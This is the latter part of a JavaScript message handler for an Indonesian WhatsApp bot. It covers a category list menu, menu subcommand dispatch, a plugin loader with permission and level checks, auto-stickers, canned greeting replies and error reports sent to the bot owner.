        description: 'Cek fitur informasi seperti bot info, stats, dll.',
        id: `${prefix}menu info`
      },
      {
        title: '💌 Anonymous',
        description: 'Gunakan fitur chat anonymous untuk ngobrol rahasia.',
        id: `${prefix}menu anonymous`
      },
      {
        title: '👫 Group',
        description: 'Fitur khusus untuk pengelolaan grup WhatsApp.',
        id: `${prefix}menu group`
      },
      {
        title: '🎮 Game',
        description: 'Mainkan game seru bersama teman-teman.',
        id: `${prefix}menu game`
      },
      {
        title: '⚔️ RPG',
        description: 'Masuk ke dalam dunia role-playing games.',
        id: `${prefix}menu rpg`
      },
      {
        title: '📂 Download',
        description: 'Unduh konten seperti video, musik, dan lainnya.',
        id: `${prefix}menu download`
      },
      {
        title: '🤖 AI',
        description: 'Eksplor fitur kecerdasan buatan (AI) yang canggih.',
        id: `${prefix}menu ai`
      },
      {
        title: '🃏 Sticker',
        description: 'Buat dan gunakan stiker di WhatsApp.',
        id: `${prefix}menu sticker`
      },
      {
        title: '🎐 Fun',
        description: 'Mainkan fitur-fitur menyenangkan di sini.',
        id: `${prefix}menu fun`
      },
      {
    title: "🔗 Short URL ",
    description: "Di Gunakan Sebagai MemperPendek Link! 🌟",
    id: `${prefix}menu shorturl`
},

      {
        title: '🔍 Search',
        description: 'Cari informasi dari berbagai sumber dengan cepat.',
        id: `${prefix}menu search`
      },
      {
    title: '👁️‍🗨️ Stalker',
    description: 'Cari tahu informasi yang kamu butuhkan dengan cepat dan mudah dari berbagai sumber! 🚀',
    id: `${prefix}menu stalker`
},

      {
        title: '🎤 Convert',
        description: 'Konversi file atau media ke format yang berbeda.',
        id: `${prefix}menu convert`
      },
      {
        title: '🕌 Islamic',
        description: 'Fitur islami seperti jadwal sholat, doa, dan lainnya.',
        id: `${prefix}menu islamic`
      },
      {
        title: '🔮 Primbon',
        description: 'Cek ramalan, shio, dan fitur spiritual lainnya.',
        id: `${prefix}menu primbon`
      },
      {
        title: '📝 Quotes',
        description: 'Dapatkan kutipan inspiratif atau motivasi.',
        id: `${prefix}menu quotes`
      },
      {
        title: '⛩️ Anime',
        description: 'Fitur khusus pecinta anime seperti quotes dan gambar.',
        id: `${prefix}menu anime`
      },
      {
        title: '🖼️ Ephoto',
        description: 'Edit foto dengan fitur ephoto menarik.',
        id: `${prefix}menu ephoto`
      },
      {
        title: '🖊️ Textpro',
        description: 'Buat teks menarik dengan efek grafis keren.',
        id: `${prefix}menu textpro`
      },
      {
        title: '🔞 NSFW',
        description: 'Fitur khusus dewasa (aktifkan dengan izin).',
        id: `${prefix}menu nsfw`
      },
      {
        title: '📡 Panel',
        description: 'Akses panel bot untuk pengaturan lebih lanjut.',
        id: `${prefix}menu panel`
      },
      {
        title: '💸 Top Up Payment',
        description: 'Fitur untuk melakukan pembayaran atau top-up.',
        id: `${prefix}menu topup`
      },
      {
        title: '👾 Bug Reports',
        description: 'Laporkan bug atau error yang terjadi.',
        id: `${prefix}menu bug`
      },
      {
        title: '🗃️ Storage',
        description: 'Kelola penyimpanan atau file media di sini.',
        id: `${prefix}menu storage`
      },
      {
        title: '⚙️ Settings',
        description: 'Atur preferensi bot sesuai kebutuhan.',
        id: `${prefix}menu settings`
      },
      {
        title: '👑 Owner',
        description: 'Fitur eksklusif untuk pemilik bot.',
        id: `${prefix}menu owner`
      }
    ]
  }
];

let listMessage = {
    title: 'List Menu', 
    sections
};


let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid,
  serverMessageId: 100,
  newsletterName
  },
 businessMessageForwardInfo: { businessOwnerJid: hanz.decodeJid(hanz.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: caption
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text:null
 }),
 header: proto.Message.InteractiveMessage.Header.create({
...(await prepareWAMessageMedia({ document: fs.readFileSync('./package.json'), fileName: `Halo ${pushname} `, mimetype: 'image/null', 
                                 fileLength: 0, 
                                 pageCount: '', 
                                 jpegThumbnail: fs.readFileSync('./stik/rangel.jpg')}, { upload: hanz.waUploadToServer})), 
title: ``,
gifPlayback: true,
subtitle:null,
hasMediaAttachment: false  
}),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 
              {
 "name": "quick_reply",
 "buttonParamsJson": `{"display_text":"BIG THANKS 🤝","id":"${prefix}tqto"}`
 
   
 },
 ],
 }),
contextInfo: {
 mentionedJid: [m.sender], 
 forwardingScore: 999,
 isForwarded: true,
 externalAdReply: { 
 title: botName, 
 body: `Runtime ${runTime}`,
 thumbnail:thumb,
 sourceUrl: web,
 mediaType: 1,
 renderLargerThumbnail: true
},
 forwardedNewsletterMessageInfo: {
 newsletterJid,
 newsletterName,
 serverMessageId: 143
}
}
})
}
}
}, { quoted: m })

if (!q) await hanz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
} )
    
let contextInfo = {
forwardingScore: 50,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid,
serverMessageId: 100,
newsletterName },
externalAdReply:{
showAdAttribution: true,
renderLargerThumbnail : true,
title: `${botName}`,
body:`${baileysVersion}`,
sourceUrl: `${web}`,
mediaType: 1, 
containsAutoReply: true,
thumbnailUrl: ''
}
}
if (args[0] === "all") {
 contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.all; 

 const caption = `${teksMenub}\n\n${readmore}\n\n${menuinfo(prefix)}\n\n\n${menuanonymous(prefix)}\n\n\n${menugrup(prefix)}\n\n\n${menugame(prefix)}\n\n\n${menurpg(prefix)}\n\n\n${menudownload(prefix)}\n\n\n${menuai(prefix)}\n\n\n${menusticker(prefix)}\n\n\n${menufun(prefix)}\n\n\n${menutools(prefix)}\n\n\n${menusearch(prefix)}\n\n\n${menustalker(prefix)}\n\n\n${menuconvert(prefix)}\n\n\n${menuislamic(prefix)}\n\n\n${menuprimbon(prefix)}\n\n\n${menuquotes(prefix)}\n\n\n${menuanime(prefix)}\n\n\n${menuephoto(prefix)}\n\n\n${menutextpro(prefix)}\n\n\n${menunsfw(prefix)}\n\n\n${menupanel(prefix)}\n\n\n${menutopup(prefix)}\n\n\n${menubug(prefix)}\n\n\n${menustorage(prefix)}\n\n\n${menusettings(prefix)}\n\n\n${menuowner(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
 } else if (args[0] === 'info') {
await sleep(1000) 
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.info; 

 const caption = `${menuinfo(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
 } else if (args[0] === 'anonymous') {
await sleep(1000)   
 contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.anonymous; 
 const caption = `${menuanonymous(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
 } else if (args[0] === 'group') {
await sleep(1000)
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.group; 
 const caption = `${menugrup(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
 } else if (args[0] === 'game') {
await sleep(1000)
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.game; 
 const caption = `${menugame(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
 } else if (args[0] === 'rpg') {
await sleep(1000)
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.rpg; 
 const caption = `${menurpg(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
 } else if (args[0] === 'download') {
await sleep(1000)
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.download; 
 const caption = `${menudownload(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
 } else if (args[0] === 'ai') {
await sleep(1000)
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.ai; 
 const caption = `${menuai(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
 } else if (args[0] === 'sticker') {
await sleep(1000)
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.sticker; 
 const caption = `${menusticker(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
 } else if (args[0] === 'fun') {
await sleep(1000)
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.fun; 
 const caption = `${menufun(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
 } else if (args[0] === 'tools') {
await sleep(1000)
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.tools; 
 const caption = `${menutools(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
} else if (args[0] === 'shorturl') {
await sleep(1000)
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.shorturl; 
 const caption = `${menushorturl(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
 } else if (args[0] === 'search') {
await sleep(1000)
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.search; 
 const caption = `${menusearch(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
} else if (args[0] === 'stalker') {
await sleep(1000)
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.stalker; 
 const caption = `${menustalker(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
 } else if (args[0] === 'convert') {
await sleep(1000)
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.convert; 
 const caption = `${menuconvert(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
 } else if (args[0] === 'islamic') {
await sleep(1000)
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.islamic; 
 const caption = `${menuislamic(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
} else if (args[0] === 'primbon') {
await sleep(1000)
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.primbon; 
 const caption = `${menuprimbon(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
} else if (args[0] === 'quotes') {
await sleep(1000)
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.quotes; 
 const caption = `${menuquotes(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
} else if (args[0] === 'anime') {
await sleep(1000)
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.anime; 
 const caption = `${menuanime(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
} else if (args[0] === 'ephoto') {
await sleep(1000)
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.ephoto; 
 const caption = `${menuephoto(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
} else if (args[0] === 'textpro') {
await sleep(1000)
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.textpro; 
 const caption = `${menutextpro(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
} else if (args[0] === 'nsfw') {
await sleep(1000)
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.nsfw; 
 const caption = `${menunsfw(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
} else if (args[0] === 'panel') {
await sleep(1000)
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.panel; 
 const caption = `${menupanel(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
} else if (args[0] === 'topup') {
await sleep(1000)
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.topup; 
 const caption = `${menutopup(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
} else if (args[0] === 'bug') {
await sleep(1000)
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.bug; 
 const caption = `${menubug(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
} else if (args[0] === 'storage') {
await sleep(1000)
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.storage; 
 const caption = `${menustorage(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
} else if (args[0] === 'settings') {
await sleep(1000)
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.settings; 
 const caption = `${menusettings(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
} else if (args[0] === 'owner') {
await sleep(1000)
contextInfo.externalAdReply.thumbnailUrl = global.imgMenu.owner;
 const caption = `${menuowner(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
 }
    }
}
break

//==============================//
    

default:
    
        
 //--------PLUGINS-------\\
let usedPrefix
let _user = global.db.data && global.db.data.users && global.db.data.users[m.sender]
const ___dirname = path.join(__dirname, './plugins')
for (let name in global.plugins) {
let plugin = global.plugins[name]
if (!plugin)
continue
if (plugin.disabled)
continue
const __filename = join(___dirname, name)
if (typeof plugin.all === 'function') {
try {
await plugin.all.call(hanz, m, {
chatUpdate,
__dirname: ___dirname,
__filename
})
} catch (e) {
console.error(e)
}
}


const str2Regex = str => str.replace(/[|\\{}()[\]^$+*?.]/g, '\\$&')
let _prefix = plugin.customPrefix ? plugin.customPrefix: prefix
let match = (_prefix instanceof RegExp ? // RegExp Mode?
[[_prefix.exec(m.body), _prefix]]:
Array.isArray(_prefix) ? // Array?
_prefix.map(p => {
let re = p instanceof RegExp ? // RegExp in Array?
p:
new RegExp(str2Regex(p))
return [re.exec(m.body), re]
}):
typeof _prefix === 'string' ? // String?
[[new RegExp(str2Regex(_prefix)).exec(m.text), new RegExp(str2Regex(_prefix))]]:
[[[], new RegExp]]
).find(p => p[1])


if (typeof plugin.before === 'function') {
if (await plugin.before.call(hanz, m, {
thePrefix,
store,
isAccept,
command,
args,
q,
match,
hanz,
prefix,
setReply,
sendButDoc,
sendButVid,
sendButImg,
sendSticker,
sendvn,
otw,
participants: m.groupMembers,
groupMetadata: m.groupMetadata,
user: m.user,
bot: m.bot,
isROwner: isOwner,
isOwner,
isRAdmin: m.isRAdmin ,
isAdmin: m.isAdmin,
isBotAdmin: m.isBotAdmin,
isPremium,
isprems: isPremium,
isResPanel,
chatUpdate,
__dirname: ___dirname,
__filename
}))
continue
}

if (typeof plugin !== 'function')
continue

let fail = plugin.fail || global.dfail 
usedPrefix = (match[0] || '')[0]||prefix



if (command || usedPrefix ) {

let noPrefix = m.body.replace(usedPrefix, '')
let _args = noPrefix.trim().split` `.slice(1)
let text = q 
var isAccept = plugin.command instanceof RegExp ? // RegExp Mode?
plugin.command.test(command):
Array.isArray(plugin.command) ? // Array?
plugin.command.some(cmd => cmd instanceof RegExp ? // RegExp in Array?
cmd.test(command) : cmd === command) : typeof plugin.command === 'string' ? // String?
plugin.command === command : false

if (!isAccept) continue


m.plugin = name
if (plugin.rowner && plugin.owner && !(isOwner)) {
fail('owner')
break
}
if (plugin.owner && !isOwner) {
fail('owner')
break
}  
if (plugin.premium && !isPremium) {
fail('premium')
break
}

if (plugin.group && !m.isGroup) {
fail('group')
break
} else if (plugin.botAdmin && !m.isBotAdmin) {
fail('botAdmin')
break
} else if (plugin.admin && !m.isAdmin) {
fail('admin')
break
}

if (plugin.private && m.isGroup) {
fail('private')
break
}
if (plugin.register && !_user.registered) {
setReply(fail('unreg'))
break
}
if (plugin.onlyprem && !m.isGroup && !isPremium) {
fail('onlyprem')
break
}
if (plugin.rpg && m.isGroup && !global.db.data.chats[m.chat].rpg) {
fail('rpg')
break
}
if (plugin.game && m.isGroup && !global.db.data.chats[m.chat].game) {
fail('game')
break
}

if (user && plugin.level > _user.level) {
hanz.reply(m.chat, `[💬] Mohon maaf level yang di perlukan untuk menggunakan fitur ini ${plugin.level}\n*Level mu:* ${_user.level} 📊`, m, {
contextInfo: {
externalAdReply: {
title: pushname, body: 'Akses Di Tolak', sourceUrl: syt, thumbnail:fs.readFileSync('./stik/danied.jpeg')
}
}
})
break
}
if (user && plugin.age > _user.age) {
hanz.reply(m.chat, `[💬] Umurmu harus diatas ${plugin.age} Tahun untuk menggunakan fitur ini...`, m, {
contextInfo: {
externalAdReply: {
title: pushname
, body: 'Akses Di Tolak', sourceUrl: web, thumbnail: fs.readFileSync('./stik/danied.jpeg')
}
}
})
break
}



let extra = {
setReply,
sendButDoc,
sendButVid,
sendButImg,
sendSticker,
sendvn,
otw,
store,
isAccept,
q,
prefix,
usedPrefix,
noPrefix,
args,
command,
text,
hanz,
participants: m.groupMembers,
groupMetadata: m.groupMetadata,
user: m.user,
bot: m.bot,
isROwner: isOwner,
isOwner,
isRAdmin: m.isRAdmin,
isAdmin: m.isAdmin,
isBotAdmin: m.isBotAdmin,
isPremium,
isResPanel,
isprems: isPremium,
chatUpdate,
__dirname: ___dirname,
__filename
}

try {
await plugin.call(hanz, m, extra)
} catch (err) {

if(err.message !== undefined){
  let e = util.format(err);
  await hanz.sendText(Ownerin, `]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\n\n© ${botName}`, m) 
  if (isCmd) Failed(toFirstCase(command), dash)
  if(checkError(err.message, db.data.listerror)) return
addError(err.message, command, db.data.listerror)
if(autoblockcmd){        
addblockcmd(command,listcmdblock) 
await setReply("Command telah di block karena terjadi error")
  }

  

await sleep(2000)
m.reply(`*🗂️ Plugin:* ${m.plugin}\n*👤 Sender:* ${m.sender}\n*💬 Chat:* ${m.chat}\n*💻 Command:* ${usedPrefix}${command} ${args.join(' ')}\n📄 *Error Logs:*\n\n\ ${e}`.trim(), nomerOwner+"@s.whatsapp.net")
} else {
  //log(err)
  let e = util.format(err)
  m.reply(`${e}`)

}




} finally {

if (typeof plugin.after === 'function') {
try {
await plugin.after.call(hanz, m, extra)
} catch (e) {
console.error(e)
}
}

}
break
}


}//akhir dari name in global plugins      
 

if ( autoDetectCmd ) {
  if (isCmd && !isAccept) {
    await Nothing(toFirstCase(command), dash, allcommand);

    const stringSimilarity = require("string-similarity");
    let matches = await stringSimilarity.findBestMatch(toFirstCase(command), allcommand);

    setReply(`ᴄᴏᴍᴍᴀɴᴅ *${prefix + command}* ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ\nᴍᴜɴɢᴋɪɴ ʏᴀɴɢ ᴋᴀᴍᴜ ᴍᴀᴋꜱᴜᴅ ᴀᴅᴀʟᴀʜ *${prefix + matches.bestMatch.target.toLowerCase()}*`);
  }
}} // Akhir switch command


// Auto Download Video TikTok


  
    
  

if (autoSticker) {
    try {
        let WSF = require('wa-sticker-formatter');
        let wsf = false;
        let mime = (m.msg || m).mimetype || '';
        
        // Jika MIME adalah image
        if (/image/.test(mime)) {
            let img = await hanz.downloadAndSaveMediaMessage(quoted, makeid(5));
            wsf = new WSF.Sticker(img, {
                pack: botName,
                type: WSF.StickerTypes.FULL,
                author: pushname,
                crop: true,
            });
        }
        // Jika MIME adalah video
        else if (/video/.test(mime)) {
            let vid = await hanz.downloadAndSaveMediaMessage(quoted, makeid(5));
            wsf = new WSF.Sticker(vid, {
                pack: botName,
                type: WSF.StickerTypes.FULL,
                author: pushname,
                crop: true,
                quality: 60, // Set kualitas stiker dari video
                fps: 10, // Set frame rate jika diperlukan
            });
        }

        // Jika wsf (stiker) sudah dibuat, kirimkan
        if (wsf) {
            await wsf.build();
            const sticBuffer = await wsf.get();
            if (sticBuffer) {
                await hanz.sendMessage(from, { sticker: sticBuffer }, { quoted: m, mimetype: 'image/webp' });
            }
        }
    } catch (err) {
        console.error(err);
    }
}


//User Private Chat
if (!isGroup && user && isPremium && new Date - user.pc < 86400000) {
} else if(!isGroup && user && isPremium && !itsMe) {
setReply( `Hai ${ucapanWaktu} kak *${pushname}*  ada yang bisa aku bantu ? silakan ketik ${prefix}menu`)
user.pc = new Date * 1
}
//Jika ada yg panggil bot
if (katabot.includes(budy)) {	
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
sendvn(halo)
}
//Jika ada yg lopyu
if (katalopyu.includes(budy)) {	
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
sendvn(lopyoutoo)
}
//Jika ada yang bilang ohayo pagi bot akan merespon✓
if(ohayo.includes(budy)){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
if (timeWib >= '11:00' && timeWib <= '23:50')  return setReply("Hadeuh sekarang udah ga pagi kak") 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
sendvn(pagi)
//setReply(`${ucapanWaktu} kak`)
}
//Jika ada yang bilang oyasumi malem bot akan merespon✓
if(katamalem.includes(budy)){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
if (timeWib >= '06:00' && timeWib <= '17:00')  return setReply("Hadeuh sekarang udah ga malem kak")
addSpam("NotCase",senderNumber, "10s", AntiSpam)
sendvn(malam)
//setReply(`${ucapanWaktu} kak`)
}
//Jika ada yang bilang koniciwa siang bot akan merespon✓
if(katasiang.includes(budy)){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
if (timeWib >= '06:00' && timeWib <= '00:00')  return setReply("Hadeuh sekarang udah ga siang kak")
addSpam("NotCase",senderNumber, "10s", AntiSpam)
 sendvn(siang)
//setReply(`${ucapanWaktu} kak`)
}
//Jika ada yg ucap salam bot akan merespon   
if (budy.startsWith('Assalamualaikum') || budy.startsWith('assalamualaikum')){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
sendvn(walaikumsalam)
}
//Jika ada yg ara bot✓
if (katara.includes(budy)) {		
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
sendvn(wibu)
}
//Jika ada yang tag nomer owner
if (isGroup && budy.includes(`${devoloper1}`)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
sendSticker(TagOwner)

}   
//ketika ada yang invite/kirim link grup di chat pribadi
//Di kasih ama Alyul
if ((type === 'groupInviteMessage' || budy.includes('https://chat') || budy.includes('Buka tautan ini')) && !m.isBaileys && !isGroup && !itsMe && !isOwner) {
let teks = dada(prefix, pushname, ucapanWaktu)      
reply (teks)
}


//Jika ada yg cek prefix bot akan merespon   
if (budy.includes('ekprefix')){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
conn.sendMessage(from,{text:  `Baik kak untuk prefix saat ini adalah : 「  ${thePrefix}  」`}, { quoted: m })
 }
//Jika ada yg toxic botz akan merespon✓
if (bad.includes(budy)) {	
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
sendvn(astaga)

}   


} catch (err){
  Log(err)
//add to dashboard
if(isCmd) Failed(toFirstCase(command), dash)
let e = util.format(err)
if(err.message.includes("Cannot find module")){
let module = err.message.split("Cannot find module '")[1].split("'")[0]
let teks = `Module ${module} belom di install
silakan install terlebih dahulu`
return await hanz.sendText(m.key.remoteJid, teks, m)
}
 await hanz.sendText(Ownerin, `]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\n\n© ${botName}`, m) 
if(checkError(err.message, db.data.listerror)) return
addError(err.message, command, db.data.listerror)
if(autoblockcmd){        
addblockcmd(command,listcmdblock) 
await setReply("Command telah di block karena terjadi error")
} 
  
if(autoReport){
if(isQuotedImage){
var media =  "Reply Image ✅"
}else if(isQuotedVideo){
var media = "Reply Video ✅"
} else if(isQuotedSticker){ 
var media = "Reply Sticker ✅"
} else if(isQuotedAudio){
var media = "Reply Audio ✅"
} else if(isQuotedTeks){
var media =  "Reply Teks ✅"
} else if(isQuotedTag){
var media =  "Reply Tag ✅"
} else {
var media = "No Quoted ❌"
}

if(q.length > "0"){
var tetek = q
} else if(q.length == "0"){
var tetek = "No Query ❌"
}

if (isGroup && isBotGroupAdmins) {
let linkgc = await hanz.groupInviteCode(from)
var yeh = `https://chat.whatsapp.com/${linkgc}`
} else if(isGroup && !isBotGroupAdmins){
var yeh = `Botz Is Not Admin`
} else if(!isGroup){
var yeh = `Botz Is Not In The Group`
} 

let teks =`\n*]─── 「 Laporan Bug ⚠️」 ───[*\n\n👤 Nama : ${pushname}\n📳 Nomer : wa.me/${senderNumber}\n📢 Info Laporan :\n       _${e}_\n🔖 Command : ${prefix}${command}\n⏰Time : ${timeWib} Wib\n📝 Query : ${tetek}\n🧩 Quoted : ${media}\n💠 Group : ${isGroup?`${groupName}`:'Di private chat'}\n🆔 ID : ${from}\n🌐 Link Group : ${yeh}\n\n\n`

hanz.sendText(Ownerin, teks, m)

/*if(!autoblockcmd){
await hanz.sendMessage(from,{ text: "Laporan error telah dikirim ke Developer Botz"})
}*/

if(isQuotedSticker || isQuotedImage || isQuotedVideo || isQuotedAudio ){
let media = await hanz.downloadAndSaveMediaMessage(quoted,makeid(5))
await hanz.sendMedia (Ownerin, media, m, {caption: "System Error"})
await fs.unlinkSync(media)
}

} 
}		



  
} catch (err){
console.log(chalk.bgRed(color("[  ERROR  ]", "black")),util.format(err))
let e = String(err) 
if (e.includes("this.isZero")) {return}
if (e.includes("rate-overlimit")) {
if(!publik) return
publik = false
await hanz.sendMessage(nomerOwner+"@s.whatsapp.net",{ 
text: `Terjadi rate-overlimit
Bot telah mengganti dari mode Public ke mode Self
Untuk menghindari spam yang berlebihan,
Silakan tunggu 1 menit hingga semua pesan
telah terbaca oleh bot`
})
await setTimeout(() => {
publik = true
 hanz.sendMessage(nomerOwner+"@s.whatsapp.net",{ 
text: `Berhasil mengubah mode self ke mode public`
})
}, 60000)
return
}
if (e.includes('Connection Closed')){ return }
if (e.includes('Timed Out')){ return }
if (e.includes('Value not found')){ return }
console.log(color('Message Error : %s', 'white'), color(util.format(e), 'green'))
if(Console){
hanz.sendMessage(Ownerin, {text : util.format(e)})
}
//console.log(e)
}
}

       
    
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.bgGreen(color("[  UPDATE ]", "black")),chalk.white(`${__filename}`) )
delete require.cache[file]
require(file)
  })